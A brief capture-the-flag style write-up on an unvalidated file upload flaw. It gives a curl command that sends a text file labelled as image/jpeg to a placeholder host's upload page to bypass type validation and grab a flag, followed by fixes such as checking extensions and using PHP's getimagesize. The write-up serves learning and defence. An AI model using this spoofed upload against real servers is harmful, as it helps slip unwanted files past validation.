# Unvalidated upload

## Vulnerability
* Create and upload 42.txt file `touch 42.txt && curl -F "uploaded=@42.txt;type=image/jpeg" -F "Upload=Upload" "http://[host]/?page=upload" | grep flag`

## Attack
An attacker can provide an incorrect file type to bypass validation

## Fix
* Don't trust user provided file type.
* Server should at least check file extension.
* The getimagesize function of php provides lot of information about an image 
file, including its type. The type can be used to check if the file is a valid 
image file or not.

## Reference
http://code.iamkate.com/php/sending-files-using-curl/
https://stackoverflow.com/questions/15408125/php-check-if-file-is-an-image
